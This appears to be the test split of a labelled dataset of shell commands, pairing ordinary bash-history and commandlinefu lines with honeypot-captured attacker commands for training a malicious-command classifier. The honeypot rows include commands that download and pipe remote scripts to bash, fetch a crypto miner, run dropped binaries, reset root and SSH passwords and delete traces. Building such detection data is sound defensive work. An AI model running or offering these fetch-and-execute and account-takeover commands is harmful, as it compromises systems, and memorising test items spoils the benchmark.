id,command,label,source,split
d2_000851,"od -An -w999 -t xC <<< ""$1"" | sed 's/[ ]\?\(c[23]\) \(..\)/%\1%\2/g;s/ /\\\\\x/g' | xargs echo -ne",0,commandlinefu,test
d2_000854,ls /var/cache/apt/archives/,0,bash_history,test
d2_000855,./C4uaUKSn,1,honeypot,test
d2_000857,alias allvars=' ( set -o posix; set ) | less',0,commandlinefu,test
d2_000859,[DEBUG][2016-08-14 15:41:39] => Success Insert Article => 서울교육대학교 음악교육과_제52회 전국초등학생음악경연대회,0,bash_history,test
d2_000865,chmod +x sshdsservers,1,honeypot,test
d2_000882,rm -rf run,0,bash_history,test
d2_000891,darkness,1,honeypot,test
d2_000895,vim abstract.tex,0,bash_history,test
d2_000901,./zombie.c,0,bash_history,test
d2_000904,/bin/busybox rm /proc/kcore/.none,1,honeypot,test
d2_000910,mysql -u root -o,0,bash_history,test
d2_000920,sudo rmmod rtsx_pci_sdmmc,0,bash_history,test
d2_000921,cp db/migrate/20150522135851_add_attachment_image_to_sliders.rb db/migrate/20150522135852_add_attachment_image_to_abouts.rb,0,bash_history,test
d2_000922,cp /usr/share/doc/cowsay/examples/cowsay_random .,0,bash_history,test
d2_000924,usermod -aG sudo ecollect,0,bash_history,test
d2_000937,head -v -n 8 /proc/meminfo,1,honeypot,test
d2_000940,wgetsite-on-aws/raw/master/config.zip -O tf.zip,0,bash_history,test
d2_000941,rm git,0,bash_history,test
d2_000948,account,0,bash_history,test
d2_000953,wget http://h1812cd2f.example.net/Pemex.sh,1,honeypot,test
d2_000958,sh bin2.sh,1,honeypot,test
d2_000983,sudo a2ensite python-web,0,bash_history,test
d2_000991,rm AddView.c,0,bash_history,test
d2_000997,rsync -e 'ssh -p PORT' user@host:SRC DEST,0,commandlinefu,test
d2_000999,chmod u+x syn2023,1,honeypot,test
d2_001000,iostat -xckd 2,0,bash_history,test
d2_001001,find -name test_*,0,bash_history,test
d2_001016,ls $(grep cifs /etc/fstab | grep -v ^# |awk ' { print $2 } ') 1>/dev/null,0,commandlinefu,test
d2_001023,bundle exec rake cucumber,0,bash_history,test
d2_001024,updatedb &,0,bash_history,test
d2_001034,url -fsSL http://ha1e67547.example.net/2start.jpg | bash -sh,1,honeypot,test
d2_001044,ssh client-Node-1,0,bash_history,test
d2_001048,ؤي /edx/app/edxapp/themes/raccoongang_theme/marvel-theme-ginkgo/lms/templates/courseware,0,bash_history,test
d2_001049,sudo apt-get install emacs,0,bash_history,test
d2_001050,"tar xzvf m,ix.tgz",1,honeypot,test
d2_001064,sudo chown -R schoolmom:schoolmom ./,0,bash_history,test
d2_001074,du -hd1 | sort -hr,0,commandlinefu,test
d2_001081,"mplayer -dumpstream -dumpfile ""yourfile"" -playlist ""URL""",0,commandlinefu,test
d2_001083,cat fx19.x86 > sshserverruntime,1,honeypot,test
d2_001086,cp -r views /var/www/modules,0,bash_history,test
d2_001087,rm -rf kbk,1,honeypot,test
d2_001091,cat config/routes.rb,0,bash_history,test
d2_001095,sysctl dev.cpu.0.freq_levels,0,commandlinefu,test
d2_001098,find . |grep brctl,0,bash_history,test
d2_001103,function cpaste () { gpg -o - -a -c $1 | curl -s -F 'sprunge=<-' http://h83c30c6f.example.net } function dpaste () { curl -s $1 | gpg -o - -d },0,commandlinefu,test
d2_001106,sudo docker rm e6286832b876,0,bash_history,test
d2_001111,cd Desktop,1,honeypot,test
d2_001116,head -100000 /dev/urandom | strings > temp.txt && for w in $(cat webster-dictionary.txt); do if [ ${#w} -gt 3 ]; then grep -io $w temp.txt; fi; done,0,commandlinefu,test
d2_001126,tee >(cat - >&2),0,commandlinefu,test
d2_001132,./V6OuGvO9,1,honeypot,test
d2_001139,./mesos-migrate-dc.py --colddc sqainfra --hotdc sqainfra --ratelimit 2,0,bash_history,test
d2_001149,cat /etc/rc.local,0,bash_history,test
d2_001150,sudo apt-get install maven3,0,bash_history,test
d2_001161,/bin/busybox echo -e '\x47\x72\x6f\x70/proc/irq' > /proc/irq/.nippon,1,honeypot,test
d2_001162,rm -fr 撣�霈堆��券餈賜�.2014.銝剛摮�嚙。MCT甇颱滿撉ㄚ/,0,bash_history,test
d2_001173,ftpget -v -u anonymous -p anonymous -P 21 abzyobl.zapto.org ftp1.sh ftp1.sh,1,honeypot,test
d2_001181,chmod 777 syn2023,1,honeypot,test
d2_001187,Ei3b,0,bash_history,test
d2_001189,rndc --gelp,0,bash_history,test
d2_001195,git config colou.ui true,0,bash_history,test
d2_001199,ifconfig eth0 7.98.246.159 7.98.246.159 && dhclient eth dhcp,0,commandlinefu,test
d2_001200,sudo echo full-speed > /proc/acpi/ibm/fan,0,bash_history,test
d2_001204,./FXVwTWAQ,1,honeypot,test
d2_001207,chmod 777 loligang.arm,1,honeypot,test
d2_001215,ssh octonode_rsa.pub,0,bash_history,test
d2_001222,:wq,0,bash_history,test
d2_001229,setuserpasswd root VivBPucWpUL,1,honeypot,test
d2_001230,arp -e,0,bash_history,test
d2_001231,"for i in */; do echo tar -cjf ""${i%/}.tar.bz2"" ""$i""; done",0,commandlinefu,test
d2_001232,wget https://h8fe31bb0.example.net/BrxX/xmrig,1,honeypot,test
d2_001236,curl -O http://h5f4946c0.example.net/8UsA.sh,1,honeypot,test
d2_001237,yaourt artwiz,0,bash_history,test
d2_001254,"awk '{print $3,$2,$1}' RS=""\n\n"" FS=""\n"" OFS="","" filename.txt",0,commandlinefu,test
d2_001261,cat ~/arandr.sh,0,bash_history,test
d2_001264,git checkout clmb/protoype,0,bash_history,test
d2_001265,hbase shell,0,bash_history,test
d2_001274,catalin123@,1,honeypot,test
d2_001279,rm MyNewProject/ -rf,0,bash_history,test
d2_001285,oc set build-secret --source bc/tasks-pipeline gogs-secret -n abi-jenkins,0,bash_history,test
d2_001287,"perl -Mojo -E 'say g(""http://ha20fa670.example.net/popclock/data/population/world"")->json->{'world'}{'population'};'",0,commandlinefu,test
d2_001289,sudo ls /etc/openvpn/client,0,bash_history,test
d2_001290,ps -ef|grep nginx,0,bash_history,test
d2_001291,cd /usr/bin/,1,honeypot,test
d2_001295,j voya,0,bash_history,test
d2_001296,sudo shred -vz -n 0 /dev/sdb,0,commandlinefu,test
d2_001298,sudo ./update_theme.shs_for_themex.io.git,0,bash_history,test
d2_001299,git config --global core.excludesfile ~/.gitignore_global,0,bash_history,test
d2_001300,nache2015,1,honeypot,test
d2_001301,chmod 777 typpaostur.sh,1,honeypot,test
d2_001306,rails g model Contact,0,bash_history,test
d2_001309,chmod +x case,0,bash_history,test
d2_001311,alias beats='echo '\''@'\''$(TZ=GMT-1 date +'\''(%-S + %-M * 60 + %-H * 3600) / 86.4'\''|bc)',0,commandlinefu,test
d2_001315,[goalador@gatanda hhneuauf.de]$ gatanda hhneuauf.de]$,0,bash_history,test
d2_001320,"find . -name '*.?pp' -exec grep -H ""string"" {} \;",0,commandlinefu,test
d2_001321,git add sum,0,bash_history,test
d2_001325,yaourt aria,0,bash_history,test
d2_001328,svn add `svn status | grep ? | cut -c9-80`,0,commandlinefu,test
d2_001329,arch,0,commandlinefu,test
d2_001335,yum install wget -y,1,honeypot,test
d2_001342,tftp -r tssh2.sh -g 127.173.194.220,1,honeypot,test
d2_001343,/bin/busybox rm -f /sys/fs/cgroup/cpuset/.nippon,1,honeypot,test
d2_001344,ffserver,0,bash_history,test
d2_001348,"box() { l=${#1}+4;x=${2:-=};n $l $x; echo ""$x $1 $x""; n $l $x; }; n() { for (( i=0; $i<$1; i=$i+1)); do printf $2; done; printf ""\n""; }",0,commandlinefu,test
d2_001354,find . |grep package,0,bash_history,test
d2_001356,chmod u+x ./ldr,0,bash_history,test
d2_001358,git add c.py,0,bash_history,test
d2_001363,smb,0,bash_history,test
d2_001364,du -h Downloads/,0,bash_history,test
d2_001366,du -hL --max-depth=1,0,commandlinefu,test
d2_001368,mpiicc -E src/dim3_sweep.c,0,bash_history,test
d2_001372,wget -e robots=off --mirror --convert-links --adjust-extension --page-requisites --recursive --no-parent www.example.com,0,commandlinefu,test
d2_001388,sudo vim lightdm-gtk-greeter.conf,0,bash_history,test
d2_001397,cd PID,1,honeypot,test
d2_001400,xvkbd -xsendevent -text $(date +%Y%m%d),0,commandlinefu,test
d2_001405,vi /etc/locale.conf,0,bash_history,test
d2_001409,rm /tmp/foo,1,honeypot,test
d2_001411,wget -r -l1 -H -t1 -nd -N -np -A.mp3 -erobots=off -i ~/sourceurls.txt,0,commandlinefu,test
d2_001421,"find . -type f -regex "".*/core.[0-9][0-9][0-9][0-9]$""",0,commandlinefu,test
d2_001424,tcpdump -nli eth0; tcpdump -nli eth0 src or dst w.x.y.z; tcpdump -nli eth0 port 80; tcpdump -nli eth0 proto udp,0,commandlinefu,test
d2_001434,vim menu.c,0,bash_history,test
d2_001449,gcc main.c -g,0,bash_history,test
d2_001451,sh bin.sh,1,honeypot,test
d2_001458,markdown doc.md >/tmp/md.$$.html && firefox -new-tab /tmp/md.$$.html >/dev/null 2>&1 && rm -f /tmp/md.$$.html,0,commandlinefu,test
d2_001467,python start_robot,0,bash_history,test
d2_001471,ls -lrth,0,bash_history,test
d2_001500,pkill -n firefox,0,commandlinefu,test
d2_001501,cat starttime.txt,0,bash_history,test
d2_001514,sh bin/overcloud-deploy.sh,0,bash_history,test
d2_001520,wget -c -t 1 --load-cookies ~/.cookies/rapidshare <URL>,0,commandlinefu,test
d2_001528,less +F somelogfile,0,commandlinefu,test
d2_001532,synoservicectl --restart sshd,0,commandlinefu,test
d2_001536,apt-cyg install git,0,bash_history,test
d2_001546,cat nss,0,bash_history,test
d2_001549,export BLOCKSIZE='sudo blockdev --getsize64 /dev/sdc' && sudo dd if=/dev/sdc bs=1MB | pv -s $BLOCKSIZE | gzip -9 > USB_SD_BACKUP.img.gz,0,commandlinefu,test
d2_001550,ll /var/lib/cloud/scripts/per-instance,0,bash_history,test
d2_001564,fswebcam /home/pi/image.jpg -v -r 800x400 --set brightness=72% --set contrast=24% --title 'Partyzone Cam 1' --save /home/pi/image.jpg,0,bash_history,test
d2_001566,npm install swiper,0,bash_history,test
d2_001574,ntpdate,0,bash_history,test
d2_001587,suso s,0,bash_history,test
d2_001593,echo $(cd $(dirname $0);pwd),0,bash_history,test
d2_001598,[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ da hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ [CHG] Controller C8:F7:33:33:E2:F7 UUIDs: 0000110b-0000-1000-8000-00805f9b34fb,0,bash_history,test
d2_001601,mutt_dotlock -t,0,bash_history,test
d2_001609,"sudo nvram boot-args=""-v""",0,commandlinefu,test
d2_001623,cat web.config,0,bash_history,test
d2_001631,tftp -r t8UsA2.sh -g 164.35.16.182,1,honeypot,test
d2_001637,sudo apt-get install vim,0,bash_history,test
d2_001643,37m ' ; '%(latency)s ms\033[1,1,honeypot,test
d2_001647,"curl -s ""http://hdc5283a9.example.net/avatar/`uuidgen | md5sum | awk '{print $1}'`?s=64&d=identicon&r=PG"" | display",0,commandlinefu,test
d2_001660,"for i in `pfiles pid|grep S_IFREG|awk '{print $5}'|awk -F"":"" '{print $2}'`; do find / -inum $i |xargs ls -lah; done",0,commandlinefu,test
d2_001661,"find ~/bin/ -name ""*sh"" -print0 | xargs -0t tar -zcvf foofile.tar.gz",0,commandlinefu,test
d2_001668,sudo apt-get install gulp,0,bash_history,test
d2_001681,sudo apt install mpich,0,bash_history,test
d2_001684,roscd learning_tf/,0,bash_history,test
d2_001686,./VOduCV8J,1,honeypot,test
d2_001688,perl zu,1,honeypot,test
d2_001690,ffmpeg -acodec copy -vcodec copy -ss 00:05:00 -t 00:20:00 -i file.mp4 file_cropped.mp4,0,commandlinefu,test
d2_001693,lbgrader list --course data301,0,bash_history,test
d2_001700,printf '*%.s' {1..40}; echo,0,commandlinefu,test
d2_001703,wlcear,1,honeypot,test
d2_001704,cd /mnt/old && tar cvf - . | ( cd /mnt/new && tar xvf - ),0,commandlinefu,test
d2_001709,"dir=$(pwd); while [ ! -z ""$dir"" ]; do ls -ld ""$dir""; dir=${dir%/*}; done; ls -ld /",0,commandlinefu,test
d2_001712,./ys808e,1,honeypot,test
d2_001713,echo $((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)),0,commandlinefu,test
d2_001728,sudo apt-get install kdenlive,0,bash_history,test
d2_001729,mkdir -p /mnt/ext3/liveuser,0,bash_history,test
d2_001730,sudo ./wifite,0,bash_history,test
d2_001735,sh /tmp/jeSjax,1,honeypot,test
d2_001736,cat include/builddefs.in,0,bash_history,test
d2_001738,ls ../samba/setup/,0,bash_history,test
d2_001746,./utILYqaW,1,honeypot,test
d2_001748,pam-auth-update,1,honeypot,test
d2_001749,./HaLGmypP,1,honeypot,test
d2_001750,sh Tadaa.sh,1,honeypot,test
d2_001751,sudo apt-get install p7zip-rar p7zip-full unace unrar zip unzip sharutils rar uudeview mpack arj cabextract file-roller,0,commandlinefu,test
d2_001757,mv .dotfiles .dots,0,bash_history,test
d2_001758,vi scriptotavio,0,bash_history,test
d2_001759,flash set SSH_PASSWORD c6bnrTNheEod,1,honeypot,test
d2_001762,"gustav0b@lo:~$ test ""$user"" = ""redes"" && echo ""user: $user"" || echo ""user: errad o""",0,bash_history,test
d2_001766,chown -R tomas:tomas ~/.ssh,0,bash_history,test
d2_001783,"git update-index --assume-unchanged ""app-ios/app-ios/Views/Meeting Detail/MeetingDetailsView.swift""",0,bash_history,test
d2_001784,mahout --help,0,bash_history,test
d2_001790,./FWktWW8a,1,honeypot,test
d2_001793,rm -r .litecoin/,0,bash_history,test
d2_001795,seq -f %g 10,0,bash_history,test
d2_001798,git branch -rm remotes/suresh/dev,0,bash_history,test
d2_001801,i2c --help,0,bash_history,test
d2_001808,toucj dummy,0,bash_history,test
d2_001812,ls -ld,0,bash_history,test
d2_001817,ssh git@gitlab.digiprojects.top -p 806 echo \$PATH,0,bash_history,test
d2_001823,./kafka-topics.sh --list --zookeeper localhost:2181,0,bash_history,test
d2_001824,cut -c 4-10 gisteren3,0,bash_history,test
d2_001840,> [goalador@gatanda corpwebsite-starterkit]$ bash: [goalador@gatanda: command not found,0,bash_history,test
d2_001844,mdk d config rm %%_grafana_ldap,0,bash_history,test
d2_001845,mv knife.rb cookbooks/mycookbook/.chef/,0,bash_history,test
d2_001846,"history | awk '{a[$2]++}END{for(i in a){print a[i] "" "" i}}' | sort -rn | head",0,commandlinefu,test
d2_001847,runpy xml.etree.cElementTree,0,bash_history,test
d2_001855,make babymarvel2,0,bash_history,test
d2_001859,chmod +x maven.sh,0,bash_history,test
d2_001866,"sudo hwclock --set --date ""08/16/2011 18:32:30""",0,bash_history,test
d2_001870,git remote add origin glafkv@delmar.umsl.edu:projectname.git,0,bash_history,test
d2_001876,ls -l | grep ^d | sed 's:.*\ ::g',0,commandlinefu,test
d2_001883,man sbcl,0,bash_history,test
d2_001886,rm 2014-09-01-060915_1920x1080_scrot.png,0,bash_history,test
d2_001890,ls -1 | rename 's/\ /_/',0,commandlinefu,test
d2_001891,find . -type f -iname '*.mp3' -exec cp {} ~/mp3/ \;,0,commandlinefu,test
d2_001892,./dmcli eRT getv Device. |grep Moca,0,bash_history,test
d2_001895,"open R,""curl -s http://h1025fe5c.example.net/Command-line-fu|xml2|""; while(<R>){ chomp; m(^/rss/channel/item/title=) and do{ s/^.*?=//; ($t,$d,$l)=($_,undef,undef) }; m(^/rss/channel/item/description=) and do{ s/^.*?=//; push @d,$_ }; m(^/rss/channel/item",0,commandlinefu,test
d2_001904,sudo rm -rf /etc/systemd/system/mongod.service,0,bash_history,test
d2_001914,useradd -p abmpmMZ1K/xOE alex,0,bash_history,test
d2_001918,rm -rf /var/tmp/.var03522123,1,honeypot,test
d2_001922,urxvt --help 2>&1| sed -n '/: /s/^ */! URxvt*/gp' >> ~/.Xresources,0,bash_history,test
